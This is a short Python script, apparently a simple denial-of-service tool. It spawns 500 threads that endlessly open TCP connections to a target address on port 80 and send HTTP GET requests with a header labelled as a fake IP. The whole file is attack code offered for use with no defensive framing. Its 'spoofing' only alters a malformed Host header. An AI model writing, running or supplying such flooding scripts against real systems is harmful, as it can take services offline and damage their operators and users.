import socket
import threading

target = "192.168.8.1"
port = 80
fake_ip = "182.30.23.31"

def ddos():
    while True:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect((target , port))
        s.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii") , (target , port))
        s.sendto((f"HOST : {fake_ip}\r\n\r\n").encode("ascii") , (target , port))
        s.close()

for i in range(500):
    thread = threading.Thread(target = ddos)
    thread.start()